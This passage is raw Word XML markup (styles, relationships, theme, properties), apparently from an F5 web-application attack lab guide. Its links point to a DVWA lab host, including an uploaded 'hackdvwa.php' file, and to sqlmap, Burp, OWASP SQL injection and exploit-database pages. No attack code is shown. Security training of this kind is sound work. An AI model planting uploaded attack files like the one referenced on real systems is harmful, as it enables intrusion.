    <w:basedOn w:val="CommentTextChar"/>
    <w:link w:val="CommentSubject"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00240F5A"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="mw-headline">
    <w:name w:val="mw-headline"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00655A98"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NormalWeb">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00655A98"/>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655A98"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="HTMLPreformatted">
    <w:name w:val="HTML Preformatted"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HTMLPreformattedChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00CC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C5DF8"/>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0374B3"/>
    <w:rPr>
      <w:color w:val="808080"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="UnresolvedMention2">
    <w:name w:val="Unresolved Mention2"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00C3001E"/>
    <w:rPr>
      <w:color w:val="808080"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading4Char">
    <w:name w:val="Heading 4 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading4"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="008245A4"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="B4101C" w:themeColor="accent1" w:themeShade="BF"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading5Char">
    <w:name w:val="Heading 5 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading5"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="004C1FB8"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="B4101C" w:themeColor="accent1" w:themeShade="BF"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="UnresolvedMention">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00FB4F2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183940">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="153228934">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="562718235">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="628240858">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="808983919">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1012800242">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1330135910">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1365443058">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1412464481">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1426682065">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1615672979">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1784223446">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1799838624">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1995374859">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="201479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qlmap.or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ebstore.f5lab.biz/" TargetMode="External"/><Relationship Id="rId42" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/header" Target="header3.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ctf.f5lab.biz" TargetMode="External"/><Relationship Id="rId33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image15.png"/><Relationship Id="rId38" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.owasp.org/index.php/SQL_Injection" TargetMode="External"/><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fing.io/" TargetMode="External"/><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f5.com/lab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ffensive-security/exploit-database" TargetMode="External"/><Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image14.png"/><Relationship Id="rId37" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.owasp.org/index.php/SQL_Injection" TargetMode="External"/><Relationship Id="rId40" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1:808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rapid7.com/free-tools/" TargetMode="External"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://dvwa.vlab.f5demo.com/hackable/uploads/hackdvwa.php" TargetMode="External"/><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image10.png"/><Relationship Id="rId36" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image17.png"/><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hyperlink" Target="https://dvwa.vlab.f5demo.com" TargetMode="External"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image13.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enable.com" TargetMode="External"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image9.png"/><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/"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F5">
      <a:dk1>
        <a:srgbClr val="231F20"/>
      </a:dk1>
      <a:lt1>
        <a:sysClr val="window" lastClr="FFFFFF"/>
      </a:lt1>
      <a:dk2>
        <a:srgbClr val="EB1C2D"/>
      </a:dk2>
      <a:lt2>
        <a:srgbClr val="FFFFFF"/>
      </a:lt2>
      <a:accent1>
        <a:srgbClr val="EB1C2D"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="656263"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="BFBFBF"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="78787A"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="E7E7E4"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="F37D85"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="231F20"/>
      </a:hlink>
      <a:folHlink>
        <a:srgbClr val="7878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182E2-A650-46DA-81C9-CD3E52E70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7339</Words>
  <Characters>41833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Burns</dc:creator>
  <cp:keywords/>
  <dc:description/>
  <cp:lastModifiedBy>Peter Scheffler</cp:lastModifiedBy>
  <cp:revision>3</cp:revision>
  <cp:lastPrinted>2017-07-04T14:45:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2018-08-02T15:35:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2018-08-02T15:38:00Z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ServerID">
    <vt:lpwstr>a7ce21b1-b0ad-4a12-a7c7-82490448801f</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="Jive_LatestUserAccountName">
    <vt:lpwstr>scheffler</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="4" name="Jive_VersionGuid">
    <vt:lpwstr>882d4641f1dc4dc793dcc0fcd8d5f26e</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="5" name="Offisync_UpdateToken">
    <vt:lpwstr>4</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="6" name="Offisync_ProviderInitializationData">
    <vt:lpwstr>https://hive.f5.com</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="7" name="Offisync_UniqueId">
    <vt:lpwstr>45033</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="8" name="Jive_PrevVersionNumber">
    <vt:lpwstr/>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="9" name="Jive_VersionGuid_v2.5">
    <vt:lpwstr/>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="10" name="Jive_LatestFileFullName">
    <vt:lpwstr>16e5c7db66b906295b739f33f543e93a</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="11" name="Jive_ModifiedButNotPublished">
    <vt:lpwstr>True</vt:lpwstr>
  </property>
</Properties>
</file>